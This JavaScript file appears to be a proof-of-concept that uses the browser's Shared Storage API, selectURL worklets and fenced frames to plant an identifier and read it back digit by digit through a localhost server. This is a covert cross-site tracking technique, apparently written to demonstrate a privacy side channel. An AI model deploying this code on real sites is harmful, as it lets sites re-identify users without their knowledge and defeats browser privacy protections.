const idServer = "localhost:8080";

async function checkUserIdentified() {
	return await (await fetch(`http://${idServer}/is-identified?uuid=${uuid}`)).status;
}

async function checkId() {
	const identified = await checkUserIdentified();
	if (identified === 200) {
		console.log("unknown");
	} else {
		console.log("known");
	}
	idExtraction();
}

async function getIDCheckURLS() {
	return await (await fetch(`http://${idServer}/identifier-check-urls?uuid=${uuid}`)).json();
}

var refresh = false;
var stop = false;

async function idExtraction() {
	const start = parseInt(window.location.hash.replace("#","")) || 0;
	const idUris = await (await fetch(`http://${idServer}/identity-extraction-urls?uuid=${uuid}`)).json();
	for (let i = start; i < 4; i++) {
		if (i >= 2 && start == 0) {
			refresh = true;
			continue;
		}
		if (i == 3 && start == 2) {
			stop = true;
		}
		let index = `${i + 1}`;
		const resolveToConfig = typeof window.FencedFrameConfig !== 'undefined';
		const selectedUrl = await window.sharedStorage.selectURL('identifier', idUris[i], {
			data: { index },
			resolveToConfig,
			keepAlive: true,
		});

		const idSlot = document.getElementById('id-slot-digit-' + index);
		console.log(idSlot);
		if (resolveToConfig && selectedUrl instanceof FencedFrameConfig) {
			idSlot.config = selectedUrl;
		} else {
			idSlot.src = selectedUrl;
		}
	}

	setTimeout(checkResults, 1000);
}

async function checkResults() {
	const results = await (await fetch(`http://${idServer}/identity-extraction-result?uuid=${uuid}`)).json();
	const ls = localStorage.getItem(`results-${uuid}`) || "";

	localStorage.setItem(`results-${uuid}`, ls + results);
	document.querySelector('.red').innerHTML = results;
	if (refresh && !stop) {
		window.location.href = `http://${idServer}/id.html#2`;
		window.location.reload();
	}
}

async function injectId() {
	await window.sharedStorage.worklet.addModule('id-worklet.js');

	window.sharedStorage.set('has-identifier', 0, {
		ignoreIfPresent: true,
	});

	const resolveToConfig = typeof window.FencedFrameConfig !== 'undefined';

	const identifierCheckUrls = await getIDCheckURLS();

	const selectedUrl = await window.sharedStorage.selectURL('has-identifier', identifierCheckUrls, {
		resolveToConfig,
		keepAlive: true,
	});


	const idSlot = document.getElementById('id-slot');
	if (resolveToConfig && selectedUrl instanceof FencedFrameConfig) {
		idSlot.config = selectedUrl;
	} else {
		idSlot.src = selectedUrl;
	}

	setTimeout(checkId, 1000);
}

injectId();
